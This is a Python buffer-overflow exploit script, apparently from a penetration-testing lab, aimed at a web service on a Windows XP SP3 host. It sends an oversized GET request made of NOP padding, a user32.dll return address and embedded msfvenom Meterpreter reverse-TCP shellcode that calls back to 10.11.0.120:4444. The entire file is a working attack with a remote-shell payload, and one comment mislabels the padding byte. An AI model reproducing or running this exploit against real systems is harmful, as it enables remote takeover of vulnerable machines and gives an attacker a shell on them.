#!/usr/bin/python #Declare this file as Python
import socket

tarAddress = "10.11.1.125"
tarPort = 123 # Init sockets

buffer= "GET "
buffer+="\x90" * 1787 # (Character is B)
buffer+="\xf7\x5a\x3d\x7e" #7e3d5af7 (user32.dll XP sp3)  endian address
buffer+="\x90" * 16 # NOP Slide
buffer+=(
"\xbd\x9d\x93\x3f\xb9\xd9\xec\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x56\x83\xc0\x04\x31\x68\x0f\x03\x68\x92\x71\xca\x45\x44\xf7"
"\x35\xb6\x94\x98\xbc\x53\xa5\x98\xdb\x10\x95\x28\xaf\x75\x19"
"\xc2\xfd\x6d\xaa\xa6\x29\x81\x1b\x0c\x0c\xac\x9c\x3d\x6c\xaf"
"\x1e\x3c\xa1\x0f\x1f\x8f\xb4\x4e\x58\xf2\x35\x02\x31\x78\xeb"
"\xb3\x36\x34\x30\x3f\x04\xd8\x30\xdc\xdc\xdb\x11\x73\x57\x82"
"\xb1\x75\xb4\xbe\xfb\x6d\xd9\xfb\xb2\x06\x29\x77\x45\xcf\x60"
"\x78\xea\x2e\x4d\x8b\xf2\x77\x69\x74\x81\x81\x8a\x09\x92\x55"
"\xf1\xd5\x17\x4e\x51\x9d\x80\xaa\x60\x72\x56\x38\x6e\x3f\x1c"
"\x66\x72\xbe\xf1\x1c\x8e\x4b\xf4\xf2\x07\x0f\xd3\xd6\x4c\xcb"
"\x7a\x4e\x28\xba\x83\x90\x93\x63\x26\xda\x39\x77\x5b\x81\x55"
"\xb4\x56\x3a\xa5\xd2\xe1\x49\x97\x7d\x5a\xc6\x9b\xf6\x44\x11"
"\xaa\x11\x77\xcd\x14\x71\x89\xee\x64\x5b\x4e\xba\x34\xf3\x67"
"\xc3\xdf\x03\x87\x16\x75\x0e\x1f\x93\x82\x0e\xa7\xcb\x96\x0e"
"\x46\x50\x1f\xe8\x38\x38\x4f\xa5\xf8\xe8\x2f\x15\x91\xe2\xa0"
"\x4a\x81\x0c\x6b\xe3\x28\xe3\xc5\x5b\xc5\x9a\x4c\x17\x74\x62"
"\x5b\x5d\xb6\xe8\x69\xa1\x79\x19\x18\xb1\x6e\x7e\xe2\x49\x6f"
"\xeb\xe2\x23\x6b\xbd\xb5\xdb\x71\x98\xf1\x43\x89\xcf\x82\x84"
"\x75\x8e\xb2\xff\x40\x04\xfa\x97\xac\xc8\xfa\x67\xfb\x82\xfa"
"\x0f\x5b\xf7\xa9\x2a\xa4\x22\xde\xe6\x31\xcd\xb6\x5b\x91\xa5"
"\x34\x85\xd5\x69\xc7\xe0\x65\x6d\x37\x76\x42\xd6\x5f\x88\xd2"
"\xe6\x9f\xe2\xd2\xb6\xf7\xf9\xfd\x39\x37\x01\xd4\x11\x5f\x88"
"\xb9\xd0\xfe\x8d\x93\xb5\x5e\x8d\x10\x6e\x51\xf4\x59\x91\x92"
"\x09\x70\xf6\x93\x09\x7c\x08\xa8\xdf\x45\x7e\xef\xe3\xf1\x71"
"\x5a\x41\x53\x18\xa4\xd5\xa3\x09") #shell 351bytes msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.120 LPORT=4444 -a x86 -b '\x00\x0a\x0d' -f c

buffer+=" HTTP/1.1\r\n\r\n" # Create buffer

print("Init sockets...")
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Create socket
print("Connecting to target...")
s.connect((tarAddress,tarPort)) # Connect to the target IP and Port
print("Sending buffer...")
s.send(buffer) # Send malformed buffer
print("Operation done. Closing...")
